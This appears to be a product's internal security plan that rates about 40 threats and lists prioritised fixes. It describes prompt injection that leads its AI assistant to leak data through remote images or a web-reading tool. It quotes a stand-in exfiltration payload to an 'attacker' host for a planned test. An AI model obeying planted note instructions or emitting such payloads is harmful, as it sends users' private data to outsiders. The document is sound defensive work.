# Security plan (2026-10-27)

A review of the code against 25 threats the owner listed and 15 more, what Folevi already does about each,
what's missing, and the work to close the gaps in order of urgency. Five read-only reviews covered the whole
codebase; the most serious findings were then checked again by hand. Nothing here has been fixed yet.

`docs/SECURITY.md` (what exists today) is out of date: it says there are no passkeys, no Google or Apple
sign-in, no breached-password check and no end-to-end encryption. All four exist now. Updating it is part of
phase 1.

## 1. In short

Folevi's base is strong for a product its size: every function checks who's calling, content is kept per
Personal or workspace with checks on every row, sessions can be ended at once, files are sniffed and served
sandboxed, links refuse `javascript:`, embeds are sandboxed, webhooks are signed both ways, logs carry no
content, and there's an append-only admin audit log. No critical hole in Folevi's own code was found.

The urgent problems are elsewhere:

1. **Out-of-date libraries with published critical flaws** (Next.js 16.3.6, DOMPurify through Mermaid).
2. **Foli AI can be tricked into sending data out**: an image in an AI answer loads from any server with no
   click, and the "read a web page" tool fetches any address the model picks without asking.
3. **Backups**: nothing backs up production on a schedule, file storage is left out of the documented export,
   and no restore has been tested.
4. **The production deploy key is exposed to third-party code in CI.**
5. **An attacker who gets into an account briefly can stay in after a password reset** (API tokens, connected
   apps and linked Google or Apple accounts survive it).

## 2. Every threat: status

**Status**: Good (handled, nothing significant found), Partial (handled with gaps), Gap (missing).
**Priority** refers to the phases in section 3: P0 now, P1 within a month, P2 within a quarter, P3 ongoing.

### 2.1 The owner's list

| Threat | Status | What's in place | What's missing | Priority |
| --- | --- | --- | --- | --- |
| SQL / NoSQL injection | Good | Convex's typed queries only, no SQL anywhere; file paths in local mode reject `..` and control characters | Nothing | |
| Cross-site scripting (XSS) | Partial | Text is escaped everywhere content is drawn; links refuse `javascript:` and `data:`; KaTeX and Mermaid run in strict modes; embeds are sandboxed; strict nonce CSP on app pages | `'unsafe-inline'` scripts still allowed on statically built pages, on app pages reached by the `*.vercel.app` address, and inside the iPhone and Mac apps (where a script would reach the native bridge); server link check lets `//evil.com` through | P2 |
| Broken access control | Good | Every function checks identity, verified email, live session and role; admin functions also need two-step | The test that guards this only looks for a helper's name and skips HTTP routes and Next.js routes | P2 |
| IDOR / BOLA | Partial | Public ids are random ULIDs; every lookup checks access; "missing" and "not yours" look the same | Upload finalize deletes a stored file named by the caller before checking ownership (`convex/files.ts:252`, also `convex/e2ee/files.ts:121`) | P1 |
| Account takeover | Partial | Reset links last 1 hour and end all sessions; Google or Apple sign-in refused when two-step is on; passkeys must verify the person; native sign-in uses PKCE with 2-minute one-time codes | Linking a Google or Apple account needs no fresh sign-in and allows a different email (`convex/auth.ts:259-262`); a reset leaves API tokens and connected apps working; `/app-google` hands an app code with no click when the link says `returned=1` | P0 / P1 |
| API key theft | Partial | Tokens hashed, shown once, scoped, revocable, rate-limited; no secrets in the web app's bundle | Tokens can be made with no expiry (the iPhone app's never expire); making one needs no fresh sign-in, sends no email and isn't logged; tokens survive a password reset | P0 / P1 |
| Session hijacking | Good | HttpOnly, Secure, SameSite cookies; 15-minute backend tokens; instant revocation; Keychain on iPhone | The new-device email only goes out when the app reports the session (an attacker using the API never triggers it) | P1 |
| SSRF | Partial | AI page reading, calendar subscriptions and webhooks resolve DNS, refuse private addresses, follow redirects by hand and cap time and size | Link previews check only the name as written, any port (`convex/bookmarks.ts:44-66`); every fetcher checks DNS then lets `fetch` resolve again (DNS rebinding) | P1 |
| Remote code execution | Partial | No `eval`, no code execution, no templates on user input; the Mac bridge accepts only its own main frame | **Next.js 16.3.6 has two published unauthenticated RCE flaws** (image optimizer, `use cache`); Folevi turns image optimization off and doesn't use `use cache`, so they're probably unreachable, but must be patched | P0 |
| Supply chain | Partial | Exact versions, frozen lockfile, install scripts allowed for 3 packages only, CI read-only, gitleaks and audit in CI, signed and notarized Mac updates | GitHub Actions pinned by tag, not commit; the production deploy key is in the environment of every CI step including `pnpm install`; Dependabot and audit skip `apps/ios`, `apps/clipper` and Swift packages; Sparkle feed itself unsigned | P0 / P1 |
| Ransomware / destructive compromise | Gap | Trash 30 days, deletion grace periods, typed confirmation for permanent delete, rate limits on bulk actions | No scheduled, off-platform, immutable backup; documented export leaves files out; no tested restore; the one backup on disk is an unencrypted production export with sign-in tables | P0 |
| Privilege escalation | Good | Admins can't touch owners or other admins; only the owner transfers ownership; invites bound to the verified email and role; only super-admins set platform roles (two-step required) | An ops admin can sign a super admin out (no guard) | P2 |
| Cross-tenant data leakage | Good | Vector search, search, presence, notifications, webhooks, MCP and REST all filter by place and re-check access | Graph link extraction sends lines from restricted notes in the same workspace to the AI (display is filtered; stored text not verified) | P2 |
| Malicious file uploads | Partial | Size and hash checked on the server; type found from the bytes; active content forced to download; image metadata stripped; sandbox CSP; safe export and import paths | The encrypted-file "unseal" path trusts the client's type and size (skips sniffing and limits); admin theme images unsniffed; no malware scanning | P1 / P2 |
| Brute-force attacks | Partial | Per-IP limits stored in the database, IP signed by the web server, two-step lockout | No per-account limit; limits are 200 times looser unless `FOLEVI_ENV` is exactly `production`; the Vault adds its own passcode lockouts | P1 |
| Credential stuffing | Partial | Breached-password check on sign-up, change and reset; per-IP limits | No bot protection (CAPTCHA or similar) and no per-account limit, so a botnet spreading tries over many addresses is never slowed | P1 |
| Phishing | Partial | Redirects limited to same-site paths; SPF and DKIM aligned; generic sign-in errors | DMARC is `p=none` (spoofed folevi.com mail still delivered); no security emails for password change, two-step turned off, passkey added, account linked, token created; `task_reminder`'s subject carries a title a collaborator wrote | P1 |
| DDoS | Partial | Rate limits on sync, uploads, exports, AI, agent, research, MCP, REST, sign-in, share links; size caps on sync batches | "Search everywhere" has no rate limit (queries can't count); per-IP limits are easy to spread; relies on Vercel and Convex for volumetric attacks | P1 / P2 |
| Insecure encryption | Partial | AES-256-GCM, HKDF, X25519, Ed25519, Argon2id 64 MiB, random from the platform; webhook secrets sealed | Dev fallback secrets are used unless `FOLEVI_ENV` is exactly `production` (a missing variable would sign file links with a secret in the source code); no rotation for server secrets; share-link passwords use PBKDF2 at 210k (current guidance 600k) | P1 / P2 |
| Insider threats | Partial | No content viewer for admins; every admin action audited; exports go to the user, not the admin | Anyone with a deploy key can run internal functions or edit the audit log from the CLI or dashboard, unrecorded; two admin views aren't audited | P2 |
| AI prompt injection | Gap | Notes, files and web pages are marked as untrusted for the model; agent edits are proposals the owner approves, with snapshots and Undo; tools act as the person | **Images in AI answers load from any server** (data leaves with no click); **"read web page" runs without asking on any URL the model picks**; routine output keeps remote images; nothing structural stops data leaving, only the model's obedience | P0 |
| Data loss | Partial | Trash, 30-day block tombstones, version history (50 plus 30 days plus named), conflict reporting, self-service export | Backups (above); permanently deleting a page also deletes other people's pages nested under it with no grace; a block delete without a version removes its whole subtree (recoverable 30 days) | P0 / P1 |
| Webhook forgery | Good | Polar and Resend verified with HMAC, 5-minute tolerance, deduplicated; outbound webhooks signed with a per-webhook secret, redirects never followed | Outbound DNS rebinding (above) | P1 |
| OAuth misconfiguration | Partial | PKCE required; self-registered apps can't skip consent; consent shows redirect hosts; every token needs a stored grant; registration limited per IP | Anyone can register an app without signing in and pick any name ("Claude") | P2 |
| Insecure logging | Good | Structured logs with ids and codes only; redactor on web routes; no third-party log sink; static check | The static check is pattern-based; one sync log line includes validator text | P2 |

### 2.2 Threats the list didn't name

| Threat | Status | What's in place | What's missing | Priority |
| --- | --- | --- | --- | --- |
| Known-vulnerable dependencies | Gap | `pnpm audit` in CI | Not acted on: 3 critical and 8 high (Next.js, DOMPurify via Mermaid, sharp's librsvg, undici, zod and dev tools) | P0 |
| CSRF | Good | Origin and Sec-Fetch-Site checks on state-changing routes, POST-only sign-out, SameSite cookies | Nothing | |
| CORS | Good | REST API `*` only with bearer tokens, no cookies; MCP origin allowlist; files CORS only for the app | Nothing | |
| Clickjacking | Good | `frame-ancestors 'none'` and `X-Frame-Options: DENY` everywhere but one internal page | Nothing | |
| Cache poisoning / private pages cached | Good | `private, no-store` on app and share pages; service worker never caches API, auth or share pages | Nothing | |
| Mass assignment / unchecked input | Partial | Block and value validation on every normal write | Importing a version accepts any block properties and restoring it writes them unchecked (`convex/documents.ts:1408`) | P1 |
| Race conditions / business-logic abuse | Good | Credits held in one transaction; quota re-checked at commit; seat limits inside the mutation; billing events idempotent and ordered | Nothing | |
| ReDoS | Partial | | Table-formula wildcards become regexes the server runs while indexing (`tableFormulas.ts:863`) | P1 |
| Prototype pollution, XXE, zip slip | Good | Paths normalised, XML only parsed by the browser | ZIP import has no unzipped-size limit (only the user's own tab) | P3 |
| Email and HTML injection | Partial | Every email value escaped, control characters refused, https links only | User-written text in reminder subjects and share emails sent to any address | P1 |
| Open redirect | Good | `returnTo` limited to same-site paths; OAuth callbacks on the app origin | Nothing | |
| User enumeration | Partial | Generic sign-in errors; workspace invites look the same either way | Sharing a page says "shared" or "invited", revealing whether an email has an account | P1 |
| Platform abuse (spam, phishing pages on folevi.com) | Gap | Invite and link-open limits; suspending a user takes their links down | No bot check or disposable-email block at sign-up; no "report abuse" for visitors; no single-link takedown for admins; public pages can be made indexable | P1 / P2 |
| Shared-computer leakage | Good | Sign-out wipes databases, caches, copies and storage; public-computer mode | Keys stay on browsers the person chose to trust (by design) | |
| Native apps, deep links, web clipper | Good | Clipper with minimal permissions and checked messages; strict deep-link allowlist; PKCE with state; origin-checked window messages | Nothing (native work is paused) | |
| Secrets in the repo | Good | gitleaks in CI; only `.env.example` tracked; nothing found in history | Nothing | |
| Environment separation | Partial | Production build refuses to deploy without `FOLEVI_ENV=production` | Dev fallbacks (mailbox, secrets, loose limits) switch on whenever the value isn't exactly `production` instead of only when it is `development` | P1 |
| Detection and response | Gap | Rate-limit hits recorded and shown to admins; admin audit log; security@folevi.com | No alerting (sign-in failure spikes, mass exports, admin actions), no incident runbook, no `security.txt`, no off-platform copy of audit logs | P1 / P2 |
| Privacy and compliance | Good | Export, scheduled deletion with email, subprocessors listed | Vault log retention line in the privacy policy (Vault plan §7.4) | P2 |

## 3. The work, in order

Each item says what to change and how it's checked. Items marked **Owner** need the owner (an account, a
setting or a decision outside the code).

### P0: now (this week)

1. **Patch the libraries.** Next.js to 16.4.1 or later; DOMPurify 3.4.17 or later (a `pnpm.overrides` entry,
   since Mermaid brings it); sharp, undici and zod to their patched versions. Run the full checks and e2e.
   Check: `pnpm audit --prod` shows no critical or high.
2. **Stop Foli AI sending data out.**
   - AI answers, routine notes and anything Foli AI writes keep remote images as links (no `<img>`); only
     images from Folevi's own files show inline.
   - "Read web page" runs only on addresses the person wrote or that came from a search result in the same
     run, never on an address the model built; anything else asks first. Web research stays on only if the
     person chooses it.
   - Check: tests where a note tells Foli AI to add `![](https://attacker/?d=…)` or to read
     `https://attacker/?d=…`, and nothing leaves.
3. **Lock down the production deploy key in CI.** Only the one step that needs it gets it (not the whole job,
   not `pnpm install`); pin every third-party action to a commit. Check: a CI review.
4. **Backups.** **Owner**: confirm the Convex plan's backups and their retention. Then: a scheduled job that
   exports production with file storage, encrypts it and keeps it off Convex in storage that can't be deleted
   for a set time (for example an R2 bucket with object lock), daily, kept 30 days plus monthly for a year; a
   restore drill into a scratch deployment every quarter, written down. Encrypt or delete the unencrypted
   production export in `backups/`.
5. **A password reset or "sign out of all devices" also ends API tokens and connected apps** (with a choice to
   keep them for "sign out of all devices"), and linking a Google or Apple account needs a fresh sign-in and
   the same email. Check: tests that a token made by a hijacked session stops working after a reset.

### P1: within a month

6. **SSRF everywhere the same way.** Link previews use the shared check (DNS, ports 80 and 443, private
   ranges); all fetchers connect to the address they checked (no second lookup), or re-check after connecting.
7. **Uploads.** Finalize checks the stored file belongs to the caller's upload before anything is deleted;
   the encrypted-file path checks type and size like the normal path.
8. **Fail closed on environment.** Dev fallbacks only when `FOLEVI_ENV` is `development` or `test`; anything
   else, including a missing value, behaves like production.
9. **Security emails** for password changed, two-step turned off, passkey added, account linked, API token
   created, new device (sent by the server when a session is created, not by the app).
10. **API tokens.** Expiry required (90 days by default, one year at most); the iPhone app's tokens renew;
    creating one needs a fresh sign-in and is audited.
11. **Bots and stuffing.** A per-account limit on password attempts (slower after each failure, never a
    permanent lock); bot protection on sign-up and sign-in (**Owner**: choose Vercel BotID or Cloudflare
    Turnstile); block disposable email domains at sign-up.
12. **Email.** **Owner**: DMARC from `p=none` to `quarantine`, then `reject` after two clean weeks of reports.
    Reminder subjects become fixed text ("A reminder from Folevi"); user-written text in share emails is shown
    as quoted text, never as a link.
13. **Enumeration.** Sharing a page answers the same whether or not the email has an account.
14. **Input checks.** Importing a version validates every block like a normal save; table-formula wildcards
    are matched without regexes (or with escaped, length-capped ones).
15. **Search everywhere** gets a limit (moved behind a counted call, or results cached per person).
16. **Permanent delete** of a page asks for manage access on every nested page or moves other people's nested
    pages to Trash instead.
17. **Alerting.** Alerts to the owner for spikes in failed sign-ins, many exports or downloads from one
    account, any platform-role change, and admin suspensions; a written incident-response runbook in
    `docs/INCIDENT_RESPONSE.md`; `/.well-known/security.txt`.
18. **Update `docs/SECURITY.md`** to what exists today.

### P2: within a quarter

19. **CSP everywhere.** Remove `'unsafe-inline'` from statically built pages (hashes), the `*.vercel.app` host
    and the app shell; narrow `img-src` on share pages; server link check refuses `//host`.
20. **Abuse handling.** "Report this page" on public links; admin takedown of a single link; a review queue.
21. **Audit log off the platform.** Admin and Vault audit entries also written to append-only storage outside
    Convex, so someone with a deploy key can't change history unseen; audit the two unaudited admin views;
    guard super-admin sessions from ops admins.
22. **Secret rotation.** Versioned sealing so `FOLEVI_HASH_SALT` and `FOLEVI_FILE_URL_SECRET` can rotate; a
    yearly rotation date; share-link passwords to PBKDF2 600k on next change.
23. **Static checks with teeth.** The auth invariant test parses functions properly and covers HTTP actions and
    Next.js routes.
24. **OAuth app registration** requires a signed-in account (or a review) and refuses names of well-known
    products.
25. **Malware scanning** of uploaded files (**Owner**: decide; a scanning service sees the bytes, so it applies
    to Standard spaces only, never to end-to-end encrypted files).
26. **AI graph** extraction skips restricted notes.

### P3: ongoing

27. Dependabot and audit for `apps/ios`, `apps/clipper` and the Swift packages; patch criticals within 48
    hours, highs within a week.
28. A yearly outside penetration test, and one before the Vault ships (Vault plan §11). **Owner**: choose a
    firm.
29. A bug-bounty or disclosure policy once `security.txt` is up.
30. Re-run this review every quarter and after each large feature.

## 4. What only the owner can do

- Confirm Convex backups (plan and retention) and create the off-platform backup bucket.
- Turn on GitHub branch protection for `main` (required CI before merge) and make Vercel's production deploy
  wait for it.
- DMARC at Namecheap: `quarantine`, then `reject`.
- Choose bot protection (Vercel BotID or Cloudflare Turnstile) and, if wanted, a malware-scanning service.
- Choose a penetration-testing firm (before the Vault ships).
- Keep the deploy keys to as few people as possible; rotate them after anyone with access leaves.
